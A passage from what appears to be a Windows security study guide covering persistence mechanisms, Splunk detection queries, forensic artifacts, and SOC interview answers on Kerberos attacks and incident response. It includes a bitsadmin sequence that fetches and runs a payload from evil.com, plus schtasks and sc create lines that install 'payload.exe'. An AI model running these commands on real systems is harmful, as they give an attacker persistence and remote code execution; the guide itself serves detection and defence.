├───────────────────────────────────────┼─────────────────────────────────┤
│ HKLM\SOFTWARE\Microsoft\              │ Active Setup - runs at user     │
│   Active Setup\Installed Components   │ logon per-user                  │
│   - StubPath                          │                                 │
├───────────────────────────────────────┼─────────────────────────────────┤
│ HKLM\SOFTWARE\Microsoft\Windows NT\   │ Image File Execution Options    │
│   CurrentVersion\Image File Execution │ "Debugger" hijacks execution    │
│   Options\<program>\Debugger          │ Global Flags for persistence    │
├───────────────────────────────────────┼─────────────────────────────────┤
│ HKLM\SOFTWARE\Microsoft\Windows NT\   │ AppInit_DLLs loaded by all GUI  │
│   CurrentVersion\Windows\             │ processes                       │
│   AppInit_DLLs                        │                                 │
└───────────────────────────────────────┴─────────────────────────────────┘

DETECTION QUERY - Registry Persistence:
index=sysmon EventCode=13
| where match(TargetObject, "(?i)\\\\CurrentVersion\\\\Run|
              \\\\Winlogon\\\\(Shell|Userinit)|
              \\\\Active Setup\\\\|Image File Execution|AppInit_DLLs")
| where NOT match(Details, "(?i)microsoft|windows")
| stats count by TargetObject, Details, User, Image, Computer

SCHEDULED TASKS:
┌─────────────────────────────────────────────────────────────────────────┐
│ Creation Methods:                                                       │
│ ├── schtasks /create /tn "TaskName" /tr "payload.exe" /sc onlogon     │
│ ├── PowerShell: Register-ScheduledTask                                 │
│ └── COM object: Schedule.Service                                       │
│                                                                         │
│ Storage:                                                                │
│ ├── C:\Windows\System32\Tasks\                                         │
│ └── Registry: HKLM\SOFTWARE\Microsoft\Windows NT\Schedule             │
│                                                                         │
│ Detection Events:                                                       │
│ ├── 4698: Scheduled task created                                       │
│ ├── 4699: Scheduled task deleted                                       │
│ ├── 4700: Scheduled task enabled                                       │
│ ├── 4702: Scheduled task updated                                       │
│ └── Sysmon Event 1: schtasks.exe execution                            │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION QUERY - Scheduled Tasks:
index=windows EventCode=4698
| spath input=TaskContent
| eval action='Actions.Exec.Command' + " " + 'Actions.Exec.Arguments'
| where NOT match(action, "(?i)microsoft|windows|adobe|google")
| stats count by TaskName, action, SubjectUserName, Computer

SERVICES:
┌─────────────────────────────────────────────────────────────────────────┐
│ Creation Methods:                                                       │
│ ├── sc create SvcName binpath= "c:\path\payload.exe" start= auto      │
│ ├── PowerShell: New-Service                                            │
│ └── Registry: HKLM\SYSTEM\CurrentControlSet\Services                   │
│                                                                         │
│ Service Types:                                                          │
│ ├── Win32 (standalone executable)                                      │
│ ├── Kernel driver                                                       │
│ └── Shared process (svchost)                                           │
│                                                                         │
│ Detection Events:                                                       │
│ ├── 7045: Service installed (System log)                               │
│ ├── 4697: Service installed (Security log)                             │
│ └── Sysmon Event 13: Service registry modification                    │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION QUERY - Services:
index=windows EventCode=7045
| where NOT match(ImagePath, "(?i)c:\\\\windows\\\\|c:\\\\program files")
| where NOT match(ServiceName, "(?i)microsoft|windows|vmware")
| eval suspicious=case(
    match(ImagePath, "(?i)\\\\temp\\\\|\\\\appdata\\\\|\\\\public\\\\"), "suspicious_path",
    match(ImagePath, "(?i)cmd\\.exe|powershell\\.exe"), "script_service",
    match(ImagePath, "(?i)\\\\\\\\"), "unc_path",
    1=1, "review"
  )
| stats count by ServiceName, ImagePath, AccountName, suspicious

WMI EVENT SUBSCRIPTIONS:
┌─────────────────────────────────────────────────────────────────────────┐
│ Components (all three required):                                        │
│ ├── EventFilter: Defines trigger condition                              │
│ ├── EventConsumer: Defines action (CommandLineEventConsumer)           │
│ └── FilterToConsumerBinding: Links filter to consumer                  │
│                                                                         │
│ Creation Methods:                                                       │
│ ├── PowerShell: Set-WmiInstance                                        │
│ ├── wmic.exe                                                            │
│ └── MOF file compilation                                                │
│                                                                         │
│ Storage: WMI repository                                                 │
│ C:\Windows\System32\wbem\Repository\                                    │
│                                                                         │
│ Detection: Sysmon Events 19, 20, 21                                    │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION QUERY - WMI Persistence:
index=sysmon EventCode IN (19, 20, 21)
| stats values(EventCode) as events, values(Name) as names,
        values(Consumer) as consumers, values(Operation) as ops
  by Computer, User
| where mvcount(events) >= 2

STARTUP FOLDERS:
├── C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
├── C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
└── Detection: Sysmon Event 11 to these paths

DLL-BASED PERSISTENCE:
├── DLL Search Order Hijacking
│   └── Place malicious DLL in application directory
├── COM Hijacking
│   └── HKCU\SOFTWARE\Classes\CLSID\{...}\InProcServer32
├── AppInit_DLLs
│   └── Loaded by all GUI processes
├── Print Monitor DLLs
│   └── HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors
└── Authentication Packages
    └── HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages

BITS JOBS:
bitsadmin /create /download persistent_job
bitsadmin /addfile persistent_job http://evil.com/payload.exe c:\payload.exe
bitsadmin /SetNotifyCmdLine persistent_job c:\payload.exe NULL
bitsadmin /SetMinRetryDelay persistent_job 60
bitsadmin /resume persistent_job

DETECTION: bitsadmin /info /verbose, PowerShell Get-BitsTransfer -AllUsers
```

---

## Windows Forensic Artifacts

```
EVIDENCE OF EXECUTION:
┌─────────────────────────────────────────────────────────────────────────┐
│ ARTIFACT              │ LOCATION / DETAILS                             │
├───────────────────────┼─────────────────────────────────────────────────┤
│ Prefetch              │ C:\Windows\Prefetch\*.pf                       │
│                       │ Shows: Execution count, first/last run time,   │
│                       │        files and directories accessed          │
│                       │ Parse with: PECmd, WinPrefetchView             │
├───────────────────────┼─────────────────────────────────────────────────┤
│ AmCache               │ C:\Windows\AppCompat\Programs\Amcache.hve     │
│                       │ Shows: SHA1 hash, file path, first execution  │
│                       │ Parse with: AmcacheParser                      │
├───────────────────────┼─────────────────────────────────────────────────┤
│ ShimCache             │ SYSTEM hive: ControlSet\Control\Session        │
│ (AppCompatCache)      │   Manager\AppCompatCache\AppCompatCache       │
│                       │ Shows: File path, last modified time           │
│                       │ May indicate execution (not guaranteed)        │
├───────────────────────┼─────────────────────────────────────────────────┤
│ BAM/DAM               │ SYSTEM hive: ControlSet\Services\bam\State\    │
│ (Background Activity) │   UserSettings\{SID}                          │
│                       │ Shows: Execution time, executable path         │
│                       │ Windows 10 1709+                               │
├───────────────────────┼─────────────────────────────────────────────────┤
│ SRUM                  │ C:\Windows\System32\sru\SRUDB.dat             │
│ (System Resource      │ Shows: Application usage, network usage,       │
│  Usage Monitor)       │        energy usage, per-application          │
│                       │ Parse with: srum-dump                          │
├───────────────────────┼─────────────────────────────────────────────────┤
│ UserAssist            │ NTUSER.DAT: Software\Microsoft\Windows\        │
│                       │   CurrentVersion\Explorer\UserAssist           │
│                       │ Shows: GUI program execution (ROT13 encoded)   │
│                       │ Parse with: UserAssist (NirSoft)               │
├───────────────────────┼─────────────────────────────────────────────────┤
│ RecentApps            │ NTUSER.DAT: Software\Microsoft\Windows\        │
│                       │   CurrentVersion\Search\RecentApps            │
│                       │ Shows: App execution with timestamp            │
├───────────────────────┼─────────────────────────────────────────────────┤
│ MUICache              │ NTUSER.DAT: Software\Classes\Local Settings\  │
│                       │   Software\Microsoft\Windows\Shell\MuiCache   │
│                       │ Shows: Executable descriptions                 │
└───────────────────────┴─────────────────────────────────────────────────┘

FILE/FOLDER KNOWLEDGE:
┌─────────────────────────────────────────────────────────────────────────┐
│ ARTIFACT              │ LOCATION / DETAILS                             │
├───────────────────────┼─────────────────────────────────────────────────┤
│ LNK Files             │ C:\Users\<user>\AppData\Roaming\Microsoft\     │
│                       │   Windows\Recent                               │
│                       │ Shows: Target path, MAC times, volume info,    │
│                       │        sometimes original location             │
├───────────────────────┼─────────────────────────────────────────────────┤
│ Jump Lists            │ C:\Users\<user>\AppData\Roaming\Microsoft\     │
│                       │   Windows\Recent\AutomaticDestinations         │
│                       │   Windows\Recent\CustomDestinations            │
│                       │ Shows: Files opened by applications            │
├───────────────────────┼─────────────────────────────────────────────────┤
│ Shellbags             │ USRCLASS.DAT: Local Settings\Software\         │
│                       │   Microsoft\Windows\Shell\BagMRU              │
│                       │ Shows: Folder access history, even deleted     │
│                       │ Parse with: ShellBagsExplorer                  │
├───────────────────────┼─────────────────────────────────────────────────┤
│ MRU Lists             │ NTUSER.DAT: Software\Microsoft\Windows\        │
│                       │   CurrentVersion\Explorer\RecentDocs          │
│                       │ Shows: Recently accessed documents              │
├───────────────────────┼─────────────────────────────────────────────────┤
│ Open/Save MRU         │ NTUSER.DAT: Software\Microsoft\Windows\        │
│                       │   CurrentVersion\Explorer\ComDlg32\           │
│                       │   OpenSavePidlMRU                              │
│                       │ Shows: Files opened via common dialogs         │
├───────────────────────┼─────────────────────────────────────────────────┤
│ Last Visited MRU      │ NTUSER.DAT: Software\Microsoft\Windows\        │
│                       │   CurrentVersion\Explorer\ComDlg32\           │
│                       │   LastVisitedPidlMRU                          │
│                       │ Shows: Apps used to open files via dialogs    │
└───────────────────────┴─────────────────────────────────────────────────┘

NETWORK ARTIFACTS:
┌─────────────────────────────────────────────────────────────────────────┐
│ ARTIFACT              │ LOCATION / DETAILS                             │
├───────────────────────┼─────────────────────────────────────────────────┤
│ Network Profiles      │ SOFTWARE: Microsoft\Windows NT\CurrentVersion\ │
│                       │   NetworkList\Profiles                         │
│                       │ Shows: Network names, dates connected          │
├───────────────────────┼─────────────────────────────────────────────────┤
│ WLAN Profiles         │ C:\ProgramData\Microsoft\Wlansvc\Profiles\    │
│                       │ Shows: WiFi networks and authentication        │
├───────────────────────┼─────────────────────────────────────────────────┤
│ SRUM Network Data     │ SRUDB.dat - Network usage per application     │
├───────────────────────┼─────────────────────────────────────────────────┤
│ Browser History       │ Chrome: \AppData\Local\Google\Chrome\         │
│                       │   User Data\Default\History                    │
│                       │ Firefox: \AppData\Roaming\Mozilla\Firefox\    │
│                       │   Profiles\<profile>\places.sqlite            │
│                       │ Edge: \AppData\Local\Microsoft\Edge\          │
│                       │   User Data\Default\History                    │
└───────────────────────┴─────────────────────────────────────────────────┘

USB DEVICE ARTIFACTS:
┌─────────────────────────────────────────────────────────────────────────┐
│ ARTIFACT              │ LOCATION / DETAILS                             │
├───────────────────────┼─────────────────────────────────────────────────┤
│ USBSTOR               │ SYSTEM: ControlSet\Enum\USBSTOR                │
│                       │ Shows: Vendor, product, serial number          │
├───────────────────────┼─────────────────────────────────────────────────┤
│ USB                   │ SYSTEM: ControlSet\Enum\USB                    │
│                       │ Shows: VID, PID of connected devices           │
├───────────────────────┼─────────────────────────────────────────────────┤
│ MountedDevices        │ SYSTEM: MountedDevices                         │
│                       │ Shows: Drive letters assigned                   │
├───────────────────────┼─────────────────────────────────────────────────┤
│ Portable Devices      │ SOFTWARE: Microsoft\Windows Portable Devices\  │
│                       │   Devices                                       │
│                       │ Shows: Last connection time                     │
├───────────────────────┼─────────────────────────────────────────────────┤
│ setupapi.dev.log      │ C:\Windows\INF\setupapi.dev.log               │
│                       │ Shows: First connection timestamp              │
└───────────────────────┴─────────────────────────────────────────────────┘

TIMELINE ANALYSIS TOOLS:
├── Plaso/Log2Timeline: Multi-source timeline creation
│   log2timeline.py --storage-file timeline.plaso /evidence
│   psort.py -o l2tcsv timeline.plaso "date > '2026-02-01'" > timeline.csv
├── KAPE: Rapid triage and artifact collection
│   kape.exe --tsource C: --target !SANS_Triage --tdest C:\KAPE\Out
├── Velociraptor: Live collection and analysis
└── Autopsy: GUI-based forensic analysis
```

---

## Interview Questions - Windows Security

### Fundamental Questions

```
1. EXPLAIN PASS-THE-HASH VS PASS-THE-TICKET

PASS-THE-HASH (PtH):
├── Uses: NTLM hash of user password
├── Protocol: NTLM authentication
├── Works with: SMB, some WMI/WinRM, NTLM-only services
├── Detection:
│   ├── NTLM authentication from unexpected sources
│   ├── Event 4624 LogonType 3 with NTLM
│   └── Workstation name mismatch
└── Limitation: Blocked by Credential Guard

PASS-THE-TICKET (PtT):
├── Uses: Kerberos ticket (TGT or TGS)
├── Protocol: Kerberos authentication
├── Works with: Any Kerberos-enabled service
├── Detection:
│   ├── Ticket use from different IP than requested
│   ├── TGS without prior TGT request from that host
│   └── Behavioral - accessing unusual resources
└── Advantage: Looks like legitimate Kerberos auth

OVERPASS-THE-HASH:
├── Uses NTLM hash to request Kerberos ticket
├── Bypasses NTLM restrictions
├── Detection: RC4 Kerberos requests (unusual today)

2. HOW DO YOU DETECT KERBEROASTING?

Detection Points:
├── Event 4769 Analysis:
│   ├── TicketEncryptionType = 0x17 (RC4)
│   ├── High volume TGS requests from single user
│   ├── Requests for service accounts (not computer accounts)
│   └── ServiceName doesn't end with $
├── Query Example:
│   index=windows EventCode=4769 TicketEncryptionType="0x17"
│   | where NOT match(ServiceName, "\$$")
│   | stats count dc(ServiceName) by TargetUserName, IpAddress
│   | where count > 10 OR dc(ServiceName) > 5
└── Mitigations:
    ├── Strong service account passwords (25+)
    ├── Group Managed Service Accounts (gMSA)
    ├── Disable RC4 (enforce AES)
    └── Monitor and alert on patterns

3. EXPLAIN GOLDEN VS SILVER VS DIAMOND TICKETS

GOLDEN TICKET:
├── Requirement: KRBTGT hash
├── Creates: Forged TGT
├── Access: Entire domain (any service, any user)
├── Lifetime: 10 years default
├── Detection: TGS without AS-REQ, unusual PAC
├── Remediation: Reset KRBTGT twice

SILVER TICKET:
├── Requirement: Service account hash
├── Creates: Forged TGS
├── Access: Specific service only
├── Advantage: No DC contact (stealthier)
├── Detection: Service access without TGS-REQ
├── Remediation: Reset service account password

DIAMOND TICKET:
├── Requirement: KRBTGT hash + legitimate TGT
├── Creates: Modified legitimate TGT
├── Advantage: Legitimate PAC signature, harder to detect
├── Detection: PAC groups don't match AD membership
├── Technique: Decrypt TGT, modify PAC, re-encrypt

4. HOW WOULD YOU INVESTIGATE A DOMAIN ADMIN COMPROMISE?

Investigation Framework:

IMMEDIATE ACTIONS:
├── Identify all DA accounts (confirm which is compromised)
├── Disable compromised account (if confirmed)
├── Check for active sessions (Get-CimInstance Win32_LogonSession)
└── Alert IR team

SCOPE ASSESSMENT:
├── Where did DA authenticate? (4624, 4672 events)
│   └── All systems touched are potentially compromised
├── What was accessed/modified?
│   ├── Group changes (4728, 4732, etc.)
│   ├── GPO modifications (5136, 5137)
│   ├── New accounts created
│   └── Password resets performed
├── DCSync activity? (4662 with replication rights)
└── Any persistence mechanisms? (Golden ticket, AdminSDHolder)

PERSISTENCE CHECK:
├── Golden Ticket: Check for KRBTGT password age
├── AdminSDHolder: Review ACL for additions
├── Scheduled tasks on DCs
├── New services on DCs
├── GPO-based persistence
└── DCShadow indicators

REMEDIATION:
├── Reset DA account password
├── Reset KRBTGT twice (if DCSync confirmed)
├── Review and clean all touched systems
├── Re-evaluate all DA authentications in timeframe
└── Rebuild DCs if necessary

5. EXPLAIN UNCONSTRAINED VS CONSTRAINED VS RBCD

UNCONSTRAINED DELEGATION:
├── Server stores user's TGT in memory
├── Server can impersonate user to ANY service
├── Attack: Compromise server, coerce admin to auth, extract TGT
├── Find: (userAccountControl:1.2.840.113556.1.4.803:=524288)
└── Very dangerous, avoid in production

CONSTRAINED DELEGATION:
├── Server can only delegate to specific SPNs
├── Uses S4U2Self (get ticket to self) + S4U2Proxy (delegate)
├── Attack: If "any auth protocol" - can modify target service
├── Find: (msds-allowedtodelegateto=*)
└── Safer, but still requires monitoring

RESOURCE-BASED CONSTRAINED DELEGATION (RBCD):
├── Target specifies who can delegate TO it
├── Stored in msDS-AllowedToActOnBehalfOfOtherIdentity
├── Attack: With write access to target, configure RBCD for your account
├── Detection: Monitor 5136 for this attribute
└── Most flexible, but exploitable with write access
```

### Scenario Questions

```
6. YOU DETECT MIMIKATZ ON A SYSTEM. WALK THROUGH YOUR RESPONSE.

DETECTION CONFIRMATION:
├── Verify detection (not false positive)
├── Identify execution context (user, time, source)
├── Check detection method (AV alert, EDR, Sysmon)
└── Assess: Is this active or historical?

IMMEDIATE CONTAINMENT:
├── Isolate the system from network (if active threat)
├── DO NOT shut down (preserve memory)
├── Identify user account used
├── Disable compromised account

SCOPE ASSESSMENT:
├── What credentials were on that system?
│   ├── Currently logged-in users
│   ├── Recent RDP sessions (check for credentials)
│   ├── Service accounts
│   └── Cached credentials
├── Where else did those credentials authenticate?
│   └── Track via 4624 events
├── Any lateral movement from this system?
├── How did attacker get here initially?

CREDENTIAL TRIAGE:
├── Force password reset for all accounts that touched the system
├── For privileged accounts - immediate reset
├── If DA credentials exposed - full domain compromise response
├── If KRBTGT touched - prepare for KRBTGT reset

EVIDENCE COLLECTION:
├── Memory acquisition
├── Event logs
├── Prefetch, AmCache, SRUM
├── Timeline analysis

7. SUSPICIOUS SERVICE INSTALLED ON DOMAIN CONTROLLER - INVESTIGATE.

CRITICAL SEVERITY - DC COMPROMISE SCENARIO

IMMEDIATE:
├── DO NOT restart DC
├── Capture volatile data (memory, network connections)
├── Check other DCs for same service
└── Engage senior IR immediately

INVESTIGATION:
├── Event 7045 analysis:
│   ├── Service name, ImagePath, AccountName
│   ├── When was it installed?
│   └── What account created it?
├── Is the binary malicious?
│   ├── Hash analysis (VirusTotal)
│   ├── Strings analysis
│   └── Behavioral analysis
├── What has the service done?
│   ├── Network connections (Sysmon 3)
│   ├── Processes spawned (Sysmon 1)
│   └── File activity

SCOPE:
├── Has DCSync occurred? (4662)
├── Group changes? (4728, 4732, etc.)
├── New accounts? (4720)
├── GPO modifications? (5136)
└── Other DCs affected?

IF CONFIRMED MALICIOUS:
├── Assume full domain compromise
├── Assume KRBTGT compromised
├── Full AD recovery procedure
├── All credentials compromised

8. USER REPORTS RANSOMWARE - INCIDENT RESPONSE

IMMEDIATE (First 5 minutes):
├── Isolate affected system from network
├── Identify patient zero
├── Check for lateral spread
├── Preserve any ransom note (evidence)
└── DO NOT pay ransom

CONTAINMENT (First hour):
├── Identify ransomware variant (ransom note, file extensions)
├── Block associated IOCs at perimeter
├── Disable affected user accounts
├── Isolate potentially affected systems
├── Check backups (are they intact?)

SCOPING:
├── What's encrypted?
├── How did it get in? (phishing, RDP, vulnerability)
├── What systems are affected?
├── Is data exfiltrated (double extortion)?
├── Timeline of events

RECOVERY:
├── Restore from backups (if clean)
├── Rebuild systems if necessary
├── Patch entry point
├── Reset all potentially compromised credentials

REPORTING:
├── Executive notification
├── Legal/compliance notification
├── Law enforcement (if required)
├── Insurance carrier (if applicable)
```

### Technical Deep-Dive Questions

```
9. WALK ME THROUGH DCSYNC DETECTION

DCSYNC OVERVIEW:
├── Attacker replicates credentials from DC
├── Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
├── Legitimate users: DCs, Domain Admins, Enterprise Admins
├── Tool: mimikatz lsadump::dcsync

DETECTION VIA EVENT 4662:
index=windows EventCode=4662
| where match(Properties, "1131f6ad.*1131f6aa") OR
        match(Properties, "Replicating Directory Changes")
| where NOT match(SubjectUserName, "\\$$")  # Exclude computer accounts
| where NOT SubjectUserName IN ("legitimate_replication_account")
| stats count by SubjectUserName, SubjectDomainName, ObjectServer

KEY INDICATORS:
├── Non-DC requesting replication
├── User account (not computer) replicating
├── Replication from unusual IP
└── Large volume of replication events

MITIGATIONS:
├── Monitor 4662 with replication rights
├── Limit replication rights strictly
├── Use Credential Guard on DCs
├── Monitor for Mimikatz patterns

10. HOW WOULD YOU DETECT PROCESS INJECTION?

SYSMON EVENT 8 (CreateRemoteThread):
index=sysmon EventCode=8
| where SourceImage != TargetImage
| where NOT match(SourceImage, "(?i)csrss|dwm|winlogon|wininit|
                                antimalware|defender")
| stats count by SourceImage, TargetImage, SourceUser

SYSMON EVENT 10 (ProcessAccess):
index=sysmon EventCode=10
| where match(GrantedAccess, "0x1F[0-9A-F]{4}")  # Full access
| where SourceImage != TargetImage
| stats count by SourceImage, TargetImage, GrantedAccess

BEHAVIORAL INDICATORS:
├── Process making network connections it shouldn't
├── Process accessing resources inconsistent with its function
├── Unsigned DLLs loaded into signed processes
├── Memory anomalies (hollowed processes)

INJECTION TECHNIQUES TO DETECT:
├── Classic DLL Injection: LoadLibrary in remote process
├── Reflective DLL Injection: No file on disk
├── Process Hollowing: Suspended process, memory replaced
├── APC Injection: QueueUserAPC
├── Thread Hijacking: SuspendThread, SetThreadContext
└── Atom Bombing: GlobalGetAtomName abuse

11. EXPLAIN HOW YOU'D BUILD AD MONITORING

CRITICAL EVENTS TO MONITOR:

AUTHENTICATION:
├── 4624/4625: Logon success/failure
├── 4648: Explicit credentials
├── 4672: Special privileges
├── 4768/4769: Kerberos TGT/TGS
└── 4776: NTLM validation

PRIVILEGE CHANGES:
├── 4728/4729: Security group membership
├── 4732/4733: Local group membership
├── 4756/4757: Universal group membership
└── Especially for: Domain Admins, Enterprise Admins, etc.

DIRECTORY CHANGES:
├── 5136/5137: Object modification/creation
├── 4662: Object access (DCSync)
└── Monitor: GPOs, AdminSDHolder, sensitive OUs

PROCESS/SERVICE:
├── 4688: Process creation (with command line)
├── 7045: Service installation
└── 4698: Scheduled task creation

ALERTING STRATEGY:
├── Critical (immediate): DA group changes, DCSync, service on DC
├── High: New admin accounts, unusual 4672, Kerberoasting patterns
├── Medium: Failed logins >threshold, after-hours admin activity
└── Low: Process execution auditing, baseline deviations
```

---

**Next: [10_LINUX_SECURITY.md](./10_LINUX_SECURITY.md) →**
